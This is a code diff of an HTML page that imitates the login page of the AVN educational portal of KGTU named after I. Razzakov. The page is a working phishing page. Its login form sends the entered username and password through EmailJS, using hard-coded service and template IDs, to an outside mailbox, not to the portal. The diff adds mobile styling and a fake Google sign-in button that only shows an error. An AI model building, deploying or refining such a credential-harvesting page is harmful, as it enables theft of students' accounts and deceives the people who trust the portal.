@@ -2,134 +2,158 @@
 <html lang="ru">
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Авторизация | Oбразовательный портал AVN</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="mobile.css" media="only screen and (max-width: 600px)">
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
       (function() {
-        emailjs.init("cx5V72evbupTwOzLB"); // Замени YOUR_USER_ID на ID пользователя из EmailJS
+        emailjs.init("cx5V72evbupTwOzLB");
       })();
     </script>
     <style>
-        body {
-            margin: 0;
-            height: 100vh; 
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            background-color: #4967a3;
-        }
-        img {
-            width: 10%;
-            aspect-ratio: auto 511/489;
-            height: 20%;
-        }
-        h1 {
-          font-family: 'Roboto', sans-serif;
-          font-weight: bold;
-          font-size: 20px;
-          margin: 10px 0;
-          color: white;
-        }
-        p {
-          font-family: Helvetica, sans-serif;
-          font-style: normal;
-          color: white;
-          font-weight: 600;
-          font-size: 24px;
-          text-shadow: 1px 1px 2px black, 0 0 1em #797777;
-        }
-        .formWrapper {
-            background: #f1f5fc;
-            border-radius: 4px;
-            color: black;
-            margin: 0 auto;
-            padding: 20px;
-            border: 2px solid #ccc;
-            box-sizing: border-box;
-            box-shadow: -1px 4px 10px 5px #00000082;
-            width: 460px;
-        }
-        .loginFormHeading {
-            font-size: 28px;
-            font-weight: 400;
-            text-shadow: none;
-            font-family: Helvetica, sans-serif;
-            font-size: 28px;
-            color: #787171;
-            font-weight: lighter;
-            text-align: center;
-            margin-bottom: 15px;
-        }
-        .formField {
-            position: relative;
-            margin-bottom: 20px;
-        }
+        /* Стили для десктопной версии */
         .form__input {
-            width: 100%;
-            color: #090909;
-            border-radius: 10px;
-            padding: 8px 0px 5px 20px;
-            font-family: Helvetica, Arial, sans-serif;
-            font-style: normal;
-            font-weight: normal;
-            border: 1px solid #b1a2a24d;
-            background: #fff;
-            font-size: 16px;
-            line-height: 26px;
-            box-sizing: border-box;
-        }
-        .eyeIcon {
-            position: absolute;
-            top: 50%;
-            right: 10px;
-            transform: translateY(-50%);
-            cursor: pointer;
-        }
-        .form__error {
-            font-size: 12px;
-            color: red;
-            display: block;
-            margin-top: 5px;
-        }
-        .google_box {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-        .google_box svg {
-            margin-right: 10px;
-        }
-        .loginSubmit {
-            width: 100%;
+            background-color: #f5f5f5; /* Фон полей ввода на настольной версии */
+            border: 1px solid #ccc; /* Граница полей */
             padding: 10px;
-            background-color: #4967a3;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            box-sizing: border-box; /* Чтобы отступы не влияли на ширину */
         }
-        .loginSubmit:hover {
-            background-color: #36508b;
+
+        .top-right-image {
+            display: none; /* Скрываем по умолчанию */
         }
-        .loginSubmit i {
-            margin-left: 5px;
+
+        @media only screen and (max-width: 600px) {
+            /* Стили для мобильной версии */
+            .top-right-image {
+                display: block; /* Показываем только на мобильных устройствах */
+                position: absolute;
+                top: 10px;
+                right: 10px;
+                width: 100px;
+                height: 100px;
+                z-index: 10;
+            }
+
+            /* Прячем текст заголовка и карточку на мобильной версии */
+            .loginFormHeading {
+                display: none;
+            }
+
+            .formWrapper {
+                margin-top: 20px;
+                background: transparent; /* Делаем фон прозрачным */
+                border: none; /* Убираем рамку карточки */
+                box-shadow: none; /* Убираем тень карточки */
+                padding: 0; /* Убираем отступы */
+                display: block; /* Делаем карточку видимой на мобильных устройствах */
+            }
+
+            /* Поля с прозрачным фоном и нижней границей */
+            .formField {
+                padding: 0 50px;
+                margin-bottom: 15px;
+                position: relative;
+            }
+
+            .form__input {
+                font-family: inherit;
+                background: transparent; /* Убираем фон только для мобильной версии */
+                border: none; /* Убираем стандартную границу */
+                border-bottom: 2px solid white; /* Нижняя граница */
+                border-radius: 0; /* Убираем округлость */
+                padding: 15px 0; /* Отступы по вертикали */
+                font-size: 18px; /* Размер шрифта */
+                width: 100%; /* Ширина 100% */
+                box-sizing: border-box; /* Чтобы отступы не влияли на ширину */
+                height: 60px; /* Одинаковая высота для полей */
+                font-weight: bold; /* Жирный шрифт */
+                outline: none;
+                color: white;
+            }
+
+            .form__input::placeholder {
+                color: white; /* Цвет текста подсказки */
+                opacity: 1; /* Убираем прозрачность, чтобы цвет отображался */
+            }
+
+            /* Кнопка "Войти" */
+            .loginSubmit {
+                
+                padding: 0 40px; /* Отступы для кнопки */
+                width: calc(100% - 80px); /* Уменьшаем ширину для кнопки */
+                margin: 0 auto; /* Центрируем кнопку */
+                font-size: 16px; /* Размер шрифта кнопки */
+                background-color: white;
+                color: black;
+                height: 65px; /* Одинаковая высота с полями ввода */
+                display: flex;
+                align-items: center; /* Выравнивание текста по центру */
+                justify-content: center;
+                margin-top: 20px;
+            }
+
+            .loginSubmit:hover {
+                background-color: #f0f0f0; /* Светло-серый фон при наведении */
+            }
+
+            /* Google button замена текста */
+            #googleSignIn {
+                font-family: inherit;
+                display: block;
+                padding: 10px; /* Отступы для кнопки */
+                width: 370px; /* Устанавливаем ширину кнопки */
+                margin: 0 auto; /* Центрируем кнопку */
+                border-radius: 8px; /* Округление кнопки */
+                background-color: white; /* Фон кнопки */
+                color: black; /* Цвет текста */
+                height: 45px; /* Высота кнопки */
+                display: flex;
+                align-items: center; /* Выравнивание текста по центру */
+                justify-content: center; /* Центрирование содержимого */
+                position: relative; /* Для размещения иконки */
+            }
+
+            /* Стили для иконки */
+            .googleIcon {
+                position: absolute; /* Абсолютное позиционирование иконки */
+                bottom: 8px;
+                left: 80px; /* Отступ от левого края */
+                height: 25px; /* Высота иконки */
+                width: 25px; /* Автоматическая ширина */
+                fill: #007AFF; /* Цвет иконки */
+            }
+
+            #googleSignIn:hover {
+                background-color: #f0f0f0; /* Светло-серый фон при наведении */
+            }
         }
     </style>
 </head>
 <body>
     <img src="img/university.png" alt="Картинка" />
+    <img src="img/icon-192x192.png" alt="Картинка в углу" class="top-right-image"/>
+
     <h1>КГТУ им. И. Раззакова</h1>
-    <p>Oбразовательный портал AVN</p>
+    <p id="portalText">Oбразовательный портал AVN</p>
 
     <div class="formWrapper">
         <form id="loginForm">
+            <!-- Google Sign-in Button -->
+            <button id="googleSignIn" style="display:none;">
+                <svg class="googleIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                    <path d="M3.05311 6.25794C4.42432 3.53443 7.24245 1.66699 10.5001 1.66699C12.7462 1.66699 14.6326 2.49278 16.0758 3.83745L13.6857 6.22761C12.8221 5.40187 11.7235 4.98138 10.5001 4.98138C8.3296 4.98138 6.49245 6.4473 5.83721 8.41699C5.6705 8.91699 5.5758 9.45108 5.5758 10.0003C5.5758 10.5496 5.6705 11.0837 5.83721 11.5837C6.49245 13.5533 8.3296 15.0192 10.5001 15.0192C11.6212 15.0192 12.5758 14.7238 13.3221 14.2238C14.2046 13.6329 14.7917 12.7503 14.9849 11.7087H10.5001V8.48516H18.3485C18.4471 9.03058 18.5001 9.59883 18.5001 10.1897C18.5001 12.7276 17.591 14.8639 16.0152 16.3147C14.6364 17.5875 12.7501 18.3337 10.5001 18.3337C7.24245 18.3337 4.42432 16.4662 3.05311 13.7427C2.48873 12.6177 2.16675 11.345 2.16675 10.0003C2.16675 8.65566 2.48873 7.38292 3.05311 6.25794Z" fill="#007AFF"></path>
+                </svg>
+                Войти с помощью Google
+            </button>
+
             <p class="loginFormHeading">Авторизация</p>
             
+           
             <!-- Поле логина -->
             <div class="formField">
                 <input name="login" placeholder="Пользователь" class="form__input" type="text" required="">
@@ -146,31 +170,51 @@
             </button>
         </form>
     </div>
-    <div id="loadingIndicator" style="display: none;">Отправка данных...</div>
 
+    <div id="loadingIndicator">Отправка данных...</div>
 
- 
-<script>
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-        event.preventDefault(); // Останавливаем стандартную отправку формы
+    <script>
+        // Показываем кнопку Google на мобильной версии и заменяем текст "Oбразовательный портал AVN"
+        function checkWindowSize() {
+            const googleButton = document.getElementById('googleSignIn');
+            const portalText = document.getElementById('portalText');
+            
+            if (window.innerWidth <= 600) {
+                googleButton.style.display = 'block';
+                portalText.style.display = 'none';
+            } else {
+                googleButton.style.display = 'none';
+                portalText.style.display = 'block';
+            }
+        }
 
-        // Показать индикатор загрузки
-        document.getElementById('loadingIndicator').style.display = 'block';
+        window.addEventListener('resize', checkWindowSize);
+        window.addEventListener('load', checkWindowSize);
 
-        // Отправка данных через EmailJS
-        emailjs.sendForm('service_x2zp7sb', 'template_8671sid', this)
-            .then(function() {
-                // Скрыть индикатор загрузки после успешной отправки
-                document.getElementById('loadingIndicator').style.display = 'none';
-                // Очистить форму после отправки
-                document.getElementById('loginForm').reset();
-            }, function(error) {
-                // Скрыть индикатор загрузки при ошибке
-                document.getElementById('loadingIndicator').style.display = 'none';
-                alert('Ошибка при отправке данных: ' + JSON.stringify(error));
-            });
-    });
-</script>
+        // Обработка нажатия кнопки Google
+        document.getElementById('googleSignIn').addEventListener('click', function() {
+            alert('Ошибка при попытке входа через Google');
+        });
 
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Останавливаем стандартную отправку формы
+
+            // Показать индикатор загрузки
+            document.getElementById('loadingIndicator').style.display = 'block';
+
+            // Отправка данных через EmailJS
+            emailjs.sendForm('service_x2zp7sb', 'template_8671sid', this)
+                .then(function() {
+                    // Скрыть индикатор загрузки после успешной отправки
+                    document.getElementById('loadingIndicator').style.display = 'none';
+                    // Очистить форму после отправки
+                    document.getElementById('loginForm').reset();
+                }, function(error) {
+                    // Скрыть индикатор загрузки при ошибке
+                    document.getElementById('loadingIndicator').style.display = 'none';
+                    alert('Ошибка при отправке данных: ' + JSON.stringify(error));
+                });
+        });
+    </script>
 </body>
 </html>
